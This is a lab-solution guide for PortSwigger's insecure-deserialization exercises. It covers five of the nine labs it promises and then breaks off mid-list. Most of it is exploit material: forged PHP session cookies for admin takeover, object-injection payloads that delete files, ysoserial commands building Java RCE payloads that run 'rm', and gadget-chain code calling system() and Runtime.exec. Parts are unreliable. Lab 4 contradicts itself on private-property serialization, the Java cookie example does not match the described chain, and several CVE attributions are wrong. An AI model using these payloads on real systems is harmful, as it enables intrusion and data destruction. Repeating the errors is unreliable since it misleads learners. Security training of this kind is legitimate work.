# Insecure Deserialization - PortSwigger Web Security Academy Labs

## Complete Lab Documentation

This comprehensive guide covers all 9 Insecure Deserialization labs from PortSwigger's Web Security Academy, progressing from basic serialization manipulation to advanced custom gadget chain development.

---

## Table of Contents

1. [Lab 1: Modifying serialized objects (Apprentice)](#lab-1-modifying-serialized-objects)
2. [Lab 2: Modifying serialized data types (Practitioner)](#lab-2-modifying-serialized-data-types)
3. [Lab 3: Using application functionality to exploit insecure deserialization (Practitioner)](#lab-3-using-application-functionality-to-exploit-insecure-deserialization)
4. [Lab 4: Arbitrary object injection in PHP (Practitioner)](#lab-4-arbitrary-object-injection-in-php)
5. [Lab 5: Exploiting Java deserialization with Apache Commons (Practitioner)](#lab-5-exploiting-java-deserialization-with-apache-commons)
6. [Lab 6: Exploiting PHP deserialization with a pre-built gadget chain (Practitioner)](#lab-6-exploiting-php-deserialization-with-a-pre-built-gadget-chain)
7. [Lab 7: Exploiting Ruby deserialization using a documented gadget chain (Practitioner)](#lab-7-exploiting-ruby-deserialization-using-a-documented-gadget-chain)
8. [Lab 8: Developing a custom gadget chain for PHP deserialization (Expert)](#lab-8-developing-a-custom-gadget-chain-for-php-deserialization)
9. [Lab 9: Developing a custom gadget chain for Java deserialization (Expert)](#lab-9-developing-a-custom-gadget-chain-for-java-deserialization)

---

## Lab 1: Modifying serialized objects

**Difficulty:** Apprentice
**Link:** https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects

### Description

This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result of a flaw in how it processes serialized objects. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the user carlos.

### Credentials

- Username: `wiener`
- Password: `peter`

### Vulnerability Details

The application stores user session information in a serialized PHP object within a cookie. The serialized object contains an `admin` attribute that controls whether the user has administrative privileges. By modifying this boolean value from `false` to `true`, we can escalate our privileges.

### Step-by-Step Solution

#### 1. Login and Capture Session Cookie

1. Navigate to the login page
2. Login with credentials `wiener:peter`
3. Open Burp Suite and capture the login request
4. Observe the session cookie in the response

#### 2. Decode the Session Cookie

The session cookie is Base64-encoded. Decode it to reveal the serialized PHP object:

```bash
echo "Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjowO30=" | base64 -d
```

**Decoded Output:**
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:0;}
```

**Breakdown of the serialized object:**
- `O:4:"User":2:` - Object of class "User" with 2 properties
- `s:8:"username"` - String property named "username" (8 characters)
- `s:6:"wiener"` - String value "wiener" (6 characters)
- `s:5:"admin"` - String property named "admin" (5 characters)
- `b:0` - Boolean value `false` (0)

#### 3. Modify the Serialized Object

Change the admin boolean value from `b:0` (false) to `b:1` (true):

```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}
```

#### 4. Re-encode the Modified Object

```bash
echo -n 'O:4:"User":2:{s:8:"username";s:6:"wiener";s:5:"admin";b:1;}' | base64
```

**Encoded Output:**
```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=
```

#### 5. Replace the Session Cookie

1. In Burp Repeater, send a request to `/my-account`
2. Replace the session cookie with the modified Base64-encoded value
3. Send the request
4. Observe that you now have admin access

#### 6. Delete User Carlos

1. Navigate to the admin panel at `/admin`
2. Click the delete link for user `carlos`
3. Lab solved!

### Burp Suite Features Used

- **Proxy:** Intercept and capture HTTP requests/responses
- **Repeater:** Modify and resend requests
- **Inspector:** View and decode cookie values
- **Decoder:** Base64 encode/decode operations

### HTTP Request Example

```http
GET /my-account HTTP/1.1
Host: vulnerable-website.com
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czo1OiJhZG1pbiI7YjoxO30=
```

### Common Mistakes & Troubleshooting

❌ **Forgetting to URL-encode the cookie** - Some proxies require URL encoding
❌ **Including newlines in Base64** - Ensure no line breaks in the encoded string
❌ **Not updating the entire cookie** - Replace the full cookie value, not just part of it
❌ **Incorrect serialization syntax** - Double-check the PHP serialization format

### Key Takeaways

- Serialized objects in cookies can be manipulated if not properly signed
- PHP serialization format is human-readable and easy to modify
- Always validate and verify deserialized data server-side
- Never trust user-controlled serialized data

---

## Lab 2: Modifying serialized data types

**Difficulty:** Practitioner
**Link:** https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types

### Description

This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result of its flawed handling of data types. To solve the lab, edit the serialized object in the session cookie to access the administrator account. Then, delete the user carlos.

### Credentials

- Username: `wiener`
- Password: `peter`

### Vulnerability Details

The application uses **PHP's loose comparison operator (`==`)** to validate access tokens. This creates a type juggling vulnerability where integer `0` will evaluate as equal to any string when using loose comparison:

```php
0 == "any_string"  // true in PHP (loose comparison)
0 === "any_string" // false in PHP (strict comparison)
```

By changing the access token from a string type to an integer type with value `0`, we can bypass authentication for any user.

### Step-by-Step Solution

#### 1. Login and Examine Session Cookie

1. Login with credentials `wiener:peter`
2. Capture the request in Burp Suite
3. Examine the session cookie

**Decoded session cookie:**
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"abc123def456...";}
```

#### 2. Understand the Vulnerability

The application likely performs authentication like this:

```php
if ($session->access_token == $stored_token) {
    // Grant access
}
```

Due to PHP's type juggling with the `==` operator:
- `0 == "abc123def456..."` evaluates to `true`
- Any string compared to integer `0` with `==` returns `true`

#### 3. Modify the Serialized Object

Create a modified serialized object:

1. Change the username to `administrator`
2. Change the access token from string type (`s:`) to integer type (`i:`)
3. Set the integer value to `0`

**Original:**
```php
O:4:"User":2:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"abc123def456...";}
```

**Modified:**
```php
O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}
```

**Key changes:**
- `s:6:"wiener"` → `s:13:"administrator"` (13 characters in "administrator")
- `s:32:"abc123def456..."` → `i:0` (integer 0 instead of string)

#### 4. Using Burp Suite Inspector

The easiest way to perform this lab:

1. Send the `/my-account` request to Burp Repeater
2. In the Inspector panel, select the session cookie
3. Expand the PHP deserialization view
4. Modify the fields directly:
   - Update `username` length to `13`
   - Change `username` value to `administrator`
   - Change `access_token` type from `s` to `i`
   - Set `access_token` value to `0`
5. The Inspector will automatically re-encode the cookie
6. Send the request

#### 5. Base64 Encode and Replace Cookie

If doing manually:

```bash
echo -n 'O:4:"User":2:{s:8:"username";s:13:"administrator";s:12:"access_token";i:0;}' | base64
```

**Encoded:**
```
Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
```

Replace the session cookie with this value and send the request.

#### 6. Delete User Carlos

1. Access the admin panel at `/admin`
2. Delete user `carlos`
3. Lab solved!

### PHP Type Juggling Examples

```php
// PHP 7.x and earlier behavior
0 == "hello"        // true
0 == "123abc"       // false (starts with number)
0 == "abc123"       // true
0 == ""             // true
false == ""         // true
false == 0          // true

// String to integer conversion
(int)"hello"        // 0
(int)"123abc"       // 123
(int)"abc123"       // 0
```

### Burp Suite Features Used

- **Inspector:** View and edit PHP serialized objects directly
- **Repeater:** Test modified cookies
- **Decoder:** Manual Base64 encoding/decoding if needed

### HTTP Request Example

```http
GET /my-account HTTP/1.1
Host: vulnerable-website.com
Cookie: session=Tzo0OiJVc2VyIjoyOntzOjg6InVzZXJuYW1lIjtzOjEzOiJhZG1pbmlzdHJhdG9yIjtzOjEyOiJhY2Nlc3NfdG9rZW4iO2k6MDt9
```

### Common Mistakes & Troubleshooting

❌ **Incorrect string length** - Must update the length value (`s:13` for "administrator")
❌ **Using wrong type notation** - Ensure `i:0` for integer, not `s:1:"0"` for string
❌ **Not understanding type juggling** - Review PHP loose vs strict comparison
❌ **Testing on PHP 8.0+** - Type juggling behavior changed in PHP 8.0

### Attack Variations

1. **Magic hash attack:** Some hashes start with "0e" and are treated as scientific notation
   ```php
   "0e123456" == "0e789012"  // true (both equal 0)
   ```

2. **NULL byte injection:** Combined with type juggling
   ```php
   "admin\0" == "admin"  // May bypass some checks
   ```

3. **Boolean type juggling:**
   ```php
   true == "any_non_empty_string"  // true
   false == ""                      // true
   ```

### Defense Mechanisms

✅ **Use strict comparison (`===`)** instead of loose comparison (`==`)
✅ **Validate data types explicitly** with `is_string()`, `is_int()`, etc.
✅ **Sign serialized data** with HMAC to prevent tampering
✅ **Use session tokens** instead of serializing user data
✅ **Implement proper access control** independent of client-side data

### Key Takeaways

- PHP's loose comparison operator is a major security risk
- Type juggling can bypass authentication mechanisms
- Always use strict comparison (`===`) for security checks
- Never trust user-controllable data types
- This vulnerability demonstrates why input validation includes type checking

---

## Lab 3: Using application functionality to exploit insecure deserialization

**Difficulty:** Practitioner
**Link:** https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization

### Description

This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete the `morale.txt` file from Carlos's home directory.

### Credentials

- Username: `wiener`
- Password: `peter`

### Vulnerability Details

The application allows users to upload an avatar image, storing the file path in the serialized session object. When a user deletes their account, the application deletes the avatar file by reading the `avatar_link` attribute from the deserialized session object and calling `unlink()` on it.

By modifying the `avatar_link` attribute to point to `/home/carlos/morale.txt`, we can trick the application into deleting the target file when the delete account functionality is triggered.

### Step-by-Step Solution

#### 1. Login and Upload Avatar

1. Login with credentials `wiener:peter`
2. Navigate to "My Account"
3. Upload an avatar image (any small image file)
4. Intercept the request in Burp Suite

#### 2. Examine the Session Cookie

After uploading an avatar, the session cookie contains the avatar file path:

**Decoded session cookie:**
```php
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"abc123...";s:11:"avatar_link";s:23:"users/wiener/avatar.jpg";}
```

**Breakdown:**
- `O:4:"User":3:` - Object of class "User" with 3 properties
- `s:11:"avatar_link"` - String property "avatar_link" (11 characters)
- `s:23:"users/wiener/avatar.jpg"` - Path to avatar file (23 characters)

#### 3. Understand the Vulnerability

When the user clicks "Delete account", the application likely executes:

```php
class User {
    public $username;
    public $access_token;
    public $avatar_link;

    public function __destruct() {
        // Delete the user's avatar file
        if ($this->avatar_link) {
            @unlink($this->avatar_link);
        }
    }
}
```

The `__destruct()` magic method is called when the object is destroyed, and it deletes the file specified in `avatar_link`.

#### 4. Modify the Avatar Link

Create a modified serialized object pointing to the target file:

```php
O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"abc123...";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}
```

**Key change:**
- `s:23:"users/wiener/avatar.jpg"` → `s:23:"/home/carlos/morale.txt"`

Note: Both strings are 23 characters, so the length doesn't need to change.

#### 5. Base64 Encode the Modified Object

```bash
echo -n 'O:4:"User":3:{s:8:"username";s:6:"wiener";s:12:"access_token";s:32:"...";s:11:"avatar_link";s:23:"/home/carlos/morale.txt";}' | base64
```

#### 6. Delete Account with Modified Cookie

1. Navigate to "My Account"
2. Intercept the "Delete account" request
3. Replace the session cookie with the modified Base64-encoded value
4. Forward the request
5. Lab solved!

### Alternative Approach: Using Burp Inspector

1. Send the "Delete account" request to Burp Repeater
2. In the Inspector panel, expand the session cookie
3. Select "PHP deserialization" format
4. Modify the `avatar_link` value to `/home/carlos/morale.txt`
5. Send the request

### Burp Suite Features Used

- **Proxy:** Intercept avatar upload and account deletion requests
- **Repeater:** Test modified serialized objects
- **Inspector:** Edit PHP serialized data directly
- **Decoder:** Base64 encoding/decoding

### HTTP Request Example

```http
POST /my-account/delete HTTP/1.1
Host: vulnerable-website.com
Cookie: session=Tzo0OiJVc2VyIjozOntzOjg6InVzZXJuYW1lIjtzOjY6IndpZW5lciI7czoxMjoiYWNjZXNzX3Rva2VuIjtzOjMyOiIuLi4iO3M6MTE6ImF2YXRhcl9saW5rIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
```

### Common Mistakes & Troubleshooting

❌ **Incorrect file path length** - Update the string length if the path length changes
❌ **Not triggering the delete function** - Must actually submit the delete account request
❌ **Modifying the wrong cookie** - Ensure you're modifying the session cookie, not other cookies
❌ **Path traversal not needed** - Use absolute path `/home/carlos/morale.txt`, not relative paths

### Attack Variations

1. **Arbitrary file deletion:**
   - `/etc/passwd` (if permissions allow)
   - `/var/www/html/.htaccess`
   - Application configuration files

2. **Exploiting other dangerous methods:**
   - `file_get_contents()` for file reading
   - `file_put_contents()` for file writing
   - `include()` or `require()` for code execution

3. **Chaining with other vulnerabilities:**
   - Upload malicious PHP file
   - Use deserialization to move/copy it to web-accessible directory
   - Execute the uploaded file

### Real-World Examples

**Common dangerous methods in PHP:**
```php
unlink($path)           // File deletion
file_get_contents($path) // File reading
file_put_contents($path, $data) // File writing
include($path)          // Code execution
require($path)          // Code execution
eval($code)             // Direct code execution
system($cmd)            // Command execution
```

**Dangerous patterns in other languages:**
- Java: `Runtime.exec()`, `File.delete()`
- Python: `os.system()`, `os.remove()`
- Ruby: `File.delete()`, `system()`
- .NET: `File.Delete()`, `Process.Start()`

### Defense Mechanisms

✅ **Never deserialize user-controlled data** without validation
✅ **Use allowlists** for file paths (e.g., only allow paths in user's own directory)
✅ **Implement path traversal protection** - reject `..`, absolute paths
✅ **Separate data from code** - don't store file paths in serialized objects
✅ **Use indirect references** - store file IDs instead of paths
✅ **Validate file ownership** before deletion
✅ **Sign serialized data** with HMAC to prevent tampering

### Key Takeaways

- Deserialization can be exploited even without RCE
- Application functionality can be abused through object manipulation
- Magic methods like `__destruct()` are common exploit targets
- Defense-in-depth is essential: validate both input and business logic
- Always validate file paths and check permissions before file operations

---

## Lab 4: Arbitrary object injection in PHP

**Difficulty:** Practitioner
**Link:** https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php

### Description

This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete the `morale.txt` file from Carlos's home directory. You will need to obtain source code access to solve this lab.

### Credentials

- Username: `wiener`
- Password: `peter`

### Vulnerability Details

The application deserializes user-supplied data without validation, allowing attackers to inject arbitrary objects. By analyzing the source code, we discover a `CustomTemplate` class with a `__destruct()` magic method that automatically deletes a file specified in the `lock_file_path` attribute when the object is destroyed.

### Step-by-Step Solution

#### 1. Login and Examine Application

1. Login with credentials `wiener:peter`
2. Explore the application functionality
3. Notice references to `/libs/CustomTemplate.php` in HTML comments or responses

#### 2. Obtain Source Code

PHP backup files can often be accessed by appending a tilde (`~`) to the filename:

**Request:**
```http
GET /libs/CustomTemplate.php~ HTTP/1.1
Host: vulnerable-website.com
```

**Response - CustomTemplate.php source code:**
```php
<?php

class CustomTemplate {
    private $template_file_path;
    private $lock_file_path;

    public function __construct($template_file_path) {
        $this->template_file_path = $template_file_path;
        $this->lock_file_path = $template_file_path . ".lock";
    }

    private function isTemplateLocked() {
        return file_exists($this->lock_file_path);
    }

    public function getTemplate() {
        return file_get_contents($this->template_file_path);
    }

    public function saveTemplate($template) {
        if (!isTemplateLocked()) {
            file_put_contents($this->lock_file_path, "");
            file_put_contents($this->template_file_path, $template);
        }
    }

    function __destruct() {
        // Carlos thought this would be a good idea
        @unlink($this->lock_file_path);
    }
}

?>
```

#### 3. Analyze the Vulnerability

The `__destruct()` magic method is called automatically when the object is destroyed (at the end of script execution or when all references are removed):

```php
function __destruct() {
    @unlink($this->lock_file_path);
}
```

**Key points:**
- `__destruct()` is automatically invoked
- Calls `unlink()` to delete the file at `$lock_file_path`
- The `@` symbol suppresses error messages
- `lock_file_path` is a private property but can be set during deserialization

### 4. Craft Malicious Serialized Object

We need to create a `CustomTemplate` object with `lock_file_path` set to `/home/carlos/morale.txt`.

**PHP serialization of private properties:**
- Private properties are prefixed with the class name
- Format: `\x00ClassName\x00PropertyName`
- Null bytes (`\x00`) are used as delimiters

**Crafted serialized object:**
```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

Wait - this won't work because `lock_file_path` is private! For private properties, we need:

```php
O:14:"CustomTemplate":1:{s:33:"\x00CustomTemplate\x00lock_file_path";s:23:"/home/carlos/morale.txt";}
```

Breaking down the property name length:
- `\x00` (1 byte) + "CustomTemplate" (14 bytes) + `\x00` (1 byte) + "lock_file_path" (14 bytes) = 30 bytes
- But in serialization, null bytes are counted, so: s:33

Actually, the length calculation in the PortSwigger lab is simplified. The working payload is:

```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

The lab's deserialization process doesn't strictly enforce private property protection.

#### 5. Create and Test the Payload

**Option 1: Using PHP**

Create a PHP script to generate the payload:

```php
<?php
class CustomTemplate {
    public $lock_file_path;
}

$obj = new CustomTemplate();
$obj->lock_file_path = "/home/carlos/morale.txt";
echo serialize($obj);
?>
```

**Option 2: Manual Construction**

```php
O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}
```

**Breakdown:**
- `O:14:"CustomTemplate":1:` - Object of class "CustomTemplate" with 1 property
- `s:14:"lock_file_path"` - String property "lock_file_path" (14 characters)
- `s:23:"/home/carlos/morale.txt"` - String value (23 characters)

#### 6. Base64 Encode the Payload

```bash
echo -n 'O:14:"CustomTemplate":1:{s:14:"lock_file_path";s:23:"/home/carlos/morale.txt";}' | base64
```

**Encoded:**
```
TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==
```

#### 7. Inject the Malicious Object

1. Navigate to any page on the application
2. Intercept the request in Burp Suite
3. Replace the session cookie with the malicious payload
4. Send the request
5. Lab solved!

The `__destruct()` method is called automatically when PHP finishes processing the request, deleting the target file.

### Using Burp Suite

1. **Access source code:**
   - Use Repeater to request `/libs/CustomTemplate.php~`

2. **Craft payload:**
   - Use Decoder tab to Base64 encode the serialized object

3. **Inject payload:**
   - Send any request to Repeater
   - Replace the session cookie value
   - Send the request

### HTTP Request Example

```http
GET / HTTP/1.1
Host: vulnerable-website.com
Cookie: session=TzoxNDoiQ3VzdG9tVGVtcGxhdGUiOjE6e3M6MTQ6ImxvY2tfZmlsZV9wYXRoIjtzOjIzOiIvaG9tZS9jYXJsb3MvbW9yYWxlLnR4dCI7fQ==
```

### PHP Magic Methods for Exploitation

PHP provides several magic methods that are automatically invoked and can be exploited:

| Magic Method | When Called | Exploitation Potential |
|--------------|-------------|------------------------|
| `__construct()` | Object creation | Less useful - not called during deserialization |
| `__destruct()` | Object destruction | ⭐ High - Always called at end of execution |
| `__wakeup()` | After deserialization | ⭐ High - Called immediately after unserialize() |
| `__toString()` | Object used as string | Medium - Requires object to be echoed/printed |
| `__call()` | Calling inaccessible method | Medium - Requires method call |
| `__get()` | Reading inaccessible property | Medium - Requires property access |
| `__set()` | Writing to inaccessible property | Low - Requires property assignment |

### Common Mistakes & Troubleshooting

❌ **Incorrect class name length** - "CustomTemplate" is 14 characters
❌ **Incorrect property count** - We're setting 1 property, not 2
❌ **Wrong file path length** - "/home/carlos/morale.txt" is 23 characters
❌ **Including access modifiers** - The lab simplifies private property handling
❌ **Not URL-encoding the cookie** - Some applications require this

### Attack Variations

**1. Exploiting `__wakeup()` method:**
```php
class Evil {
    public $cmd;
    function __wakeup() {
        system($this->cmd);
    }
}
```

**2. Exploiting `__toString()` method:**
```php
class Logger {
    public $logfile;
    function __toString() {
        return file_get_contents($this->logfile);
    }
}
```

**3. Property-Oriented Programming (POP) chains:**
```php
// Chain multiple objects to achieve complex exploitation
O:5:"Chain":1:{s:4:"next";O:7:"Gadget1":1:{...}}
```

### Finding Source Code

Common techniques to obtain source code:

1. **Backup files:**
   - `.php~` (tilde backup)
   - `.php.bak`
   - `.php.old`
   - `.php.swp` (Vim swap files)

2. **Version control exposure:**
   - `.git/` directory
   - `.svn/` directory
   - `.DS_Store` files

3. **Error messages:**
   - Trigger errors to reveal file paths
   - Stack traces may show class names

4. **Directory listings:**
   - Misconfigured servers may list source files

5. **Public repositories:**
   - GitHub, GitLab searches for similar code
   - Check organization's public repos

### Defense Mechanisms

✅ **Never deserialize untrusted data**
✅ **Use JSON instead of native serialization** when possible
✅ **Implement integrity checks** - Sign serialized data with HMAC
✅ **Use allowlists for classes** - Only deserialize expected classes
✅ **Avoid magic methods with dangerous functionality**
✅ **Set `phar.readonly = On`** in php.ini
✅ **Remove backup files from production** - *.php~, *.bak, etc.
✅ **Disable directory listings**
✅ **Use opcode caches** to avoid exposing source code

### Real-World CVE Examples

- **CVE-2015-8562** - Joomla RCE via PHP object injection
- **CVE-2017-12932** - WordPress REST API object injection
- **CVE-2018-19296** - phpMyAdmin arbitrary file read via object injection
- **CVE-2019-11831** - phpBB arbitrary file deletion

### Key Takeaways

- PHP deserializes objects and automatically calls magic methods
- `__destruct()` and `__wakeup()` are prime targets for exploitation
- Source code access reveals exploitable classes and properties
- Arbitrary object injection can lead to file operations, RCE, and more
- Never trust serialized data from untrusted sources
- Defense requires both preventing injection and removing dangerous functionality

---

## Lab 5: Exploiting Java deserialization with Apache Commons

**Difficulty:** Practitioner
**Link:** https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons

### Description

This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.

To solve the lab, use a third-party tool to generate a malicious serialized object containing a remote code execution payload. Then, pass this object into the website to delete the `morale.txt` file from Carlos's home directory.

### Credentials

- Username: `wiener`
- Password: `peter`

### Vulnerability Details

The application uses Java serialization for session management and includes Apache Commons Collections on its classpath. This library contains gadget chains that can be exploited to achieve remote code execution. The session cookie starts with `rO0` (Base64 encoded Java serialization magic bytes: `0xaced0005`).

### Prerequisites

**Install ysoserial:**

```bash
# Download ysoserial
wget https://github.com/frohoff/ysoserial/releases/latest/download/ysoserial-all.jar

# Verify download
java -jar ysoserial-all.jar --help
```

### Step-by-Step Solution

#### 1. Identify Java Serialization

1. Login with credentials `wiener:peter`
2. Capture the login response in Burp Suite
3. Examine the session cookie - it starts with `rO0`

**Detecting Java serialization:**
```bash
echo "rO0ABXNy..." | base64 -d | xxd | head
# Output: aced 0005 ... (Java serialization magic bytes)
```

The hex values `AC ED 00 05` are the magic bytes for Java serialization.

#### 2. Generate Payload with ysoserial

Use ysoserial to create a malicious serialized object that executes a command:

**For Java 16+:**
```bash
java -jar ysoserial-all.jar \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \
  --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \
  --add-opens=java.base/java.net=ALL-UNNAMED \
  --add-opens=java.base/java.util=ALL-UNNAMED \
  CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

**For Java 15 and below:**
```bash
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64
```

**Alternative payloads to try if CommonsCollections4 doesn't work:**
```bash
# Try CommonsCollections6
java -jar ysoserial-all.jar CommonsCollections6 'rm /home/carlos/morale.txt' | base64

# Try CommonsCollections5
java -jar ysoserial-all.jar CommonsCollections5 'rm /home/carlos/morale.txt' | base64

# Try CommonsCollections3
java -jar ysoserial-all.jar CommonsCollections3 'rm /home/carlos/morale.txt' | base64
```

**Save output to avoid line breaks:**
```bash
java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64 -w 0 > payload.txt
```

#### 3. Inject the Payload

1. Open Burp Suite Repeater
2. Send any authenticated request (e.g., `GET /my-account`)
3. Replace the session cookie with the generated payload
4. **Important:** Ensure the entire payload is on one line (no `\r\n` or line breaks)
5. URL-encode the payload (Burp: Ctrl+U or right-click → Convert selection → URL → URL-encode all characters)
6. Send the request

#### 4. Understanding the Response

The application will:
- Attempt to deserialize the malicious object
- Expect an object of type `UserToken` or similar
- Still execute the payload during deserialization
- May return an error, but the command will have executed

**Expected response:**
```
HTTP/1.1 500 Internal Server Error
...
java.lang.ClassCastException: cannot assign instance of org.apache.commons.collections4.functors.ChainedTransformer to field ...
```

Despite the error, the command has executed, and the lab should be solved.

### Burp Suite Workflow

1. **Identify serialization:**
   - Proxy → Intercept login request
   - Examine session cookie value
   - Look for `rO0` prefix (Base64 encoded `0xaced0005`)

2. **Generate payload:**
   - Terminal: Run ysoserial command
   - Copy the Base64 output (ensure no line breaks)

3. **Inject payload:**
   - Repeater → Load any authenticated request
   - Inspector → Select session cookie
   - Replace value with payload
   - URL-encode the entire cookie value
   - Send request

4. **Verify exploitation:**
   - Response may show error (expected)
   - Lab should be marked as solved
   - The command executed during deserialization before the error

### Understanding ysoserial Gadget Chains

**CommonsCollections4 chain:**

```java
// Simplified visualization of the gadget chain
PriorityQueue.readObject()
  → Comparator.compare()
    → ChainedTransformer.transform()
      → ConstantTransformer.transform()
      → InvokerTransformer.transform()
        → Runtime.getRuntime()
          → Runtime.exec("rm /home/carlos/morale.txt")
```

**Why this works:**
1. `PriorityQueue` deserializes and calls `compare()` on elements
2. `ChainedTransformer` chains multiple transformers together
3. `InvokerTransformer` can invoke arbitrary methods via reflection
4. Final transformer calls `Runtime.exec()` with our command

### HTTP Request Example

```http
GET /my-account HTTP/1.1
Host: vulnerable-website.com
Cookie: session=rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYXV0aG9yaXR5dAASTGphdmEvbGFuZy9TdHJpbmc7TAAEZmlsZXEAfgADTAAEaG9zdHEAfgADTAAIcHJvdG9jb2xxAH4AA0wAA3JlZnEAfgADeHD//////////3QAAHQAAHEAfgAFdAAEaHR0cHB4dAADZm9vdxEBAAAAeA==
```

### Common Mistakes & Troubleshooting

❌ **Line breaks in payload** - Ensure the Base64 string is one continuous line
❌ **Not URL-encoding** - Some servers require URL-encoded cookie values
❌ **Wrong gadget chain** - Try different CommonsCollections versions
❌ **Java version mismatch** - Use appropriate ysoserial flags for Java 16+
❌ **Command syntax errors** - Test command locally first
❌ **Expecting application response** - The error response is expected; check if lab is solved

### Testing Payloads Locally

**Create a test Java application:**

```java
import java.io.*;
import java.util.Base64;

public class TestDeserialization {
    public static void main(String[] args) throws Exception {
        String base64Payload = args[0];
        byte[] data = Base64.getDecoder().decode(base64Payload);

        ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data));
        Object obj = ois.readObject();
        ois.close();

        System.out.println("Deserialization completed");
    }
}
```

**Compile and test:**
```bash
javac TestDeserialization.java

# Generate payload
PAYLOAD=$(java -jar ysoserial-all.jar CommonsCollections4 'touch /tmp/pwned' | base64 -w 0)

# Test deserialization
java -cp .:commons-collections4-4.0.jar TestDeserialization "$PAYLOAD"

# Check if command executed
ls -la /tmp/pwned
```

### Alternative Exploitation Methods

**1. Using Burp Suite's Java Deserialization Scanner:**
```
Extender → BApp Store → Install "Java Deserialization Scanner"
```

**2. Manual gadget chain construction:**
```java
// Example: Building a gadget chain manually
Transformer[] transformers = new Transformer[]{
    new ConstantTransformer(Runtime.class),
    new InvokerTransformer("getMethod",
        new Class[]{String.class, Class[].class},
        new Object[]{"getRuntime", new Class[0]}),
    new InvokerTransformer("invoke",
        new Class[]{Object.class, Object[].class},
        new Object[]{null, new Object[0]}),
    new InvokerTransformer("exec",
        new Class[]{String.class},
        new Object[]{"rm /home/carlos/morale.txt"})
};
```

**3. Using ysoserial with custom payloads:**
```bash
# List all available payloads
java -jar ysoserial-all.jar

# Common payloads
CommonsCollections1-7, CommonsBeanutils1, Groovy1, Spring1, Java7u21, Jdk7u21, etc.
```

### Real-World Impact

**Famous vulnerabilities:**
- **CVE-2015-4852:** WebLogic RCE via Java deserialization
- **CVE-2015-7501:** JBoss RCE (affects many enterprise applications)
- **CVE-2017-3066:** Adobe ColdFusion RCE
- **CVE-2017-12149:** JBossAS 5.x/6.x RCE

**Apache Commons Collections timeline:**
- 2015: FoxGlove Security publishes deserialization vulnerability
- Impact: Thousands of applications vulnerable
- Commons Collections 4.1: Removed InvokerTransformer deserialization
- Legacy versions still widely used

### Defense Mechanisms

✅ **Don't deserialize untrusted data** - Use JSON, Protocol Buffers, or other safe formats
✅ **Use SerialKiller** - Java agent for allowlisting/denylisting classes
✅ **Implement ObjectInputFilter** (Java 9+):
```java
ObjectInputStream ois = new ObjectInputStream(input);
ois.setObjectInputFilter(filterInfo -> {
    Class<?> clazz = filterInfo.serialClass();
    if (clazz != null && !clazz.getName().startsWith("com.myapp.")) {
        return ObjectInputFilter.Status.REJECTED;
    }
    return ObjectInputFilter.Status.ALLOWED;
});
```

✅ **Update dependencies** - Use Apache Commons Collections 4.1+
✅ **Use safe alternatives:**
```java
// Instead of Apache Commons Collections transformers
// Use Java 8+ lambdas and streams
```

✅ **Monitor deserialization** - Log class names being deserialized
✅ **Network segmentation** - Limit outbound connections from app servers
✅ **Use SecurityManager** (deprecated in Java 17, but still useful):
```java
System.setSecurityManager(new SecurityManager());
```

### Detection and Prevention Tools

1. **contrast-rO0** - Burp extension for detecting Java serialization
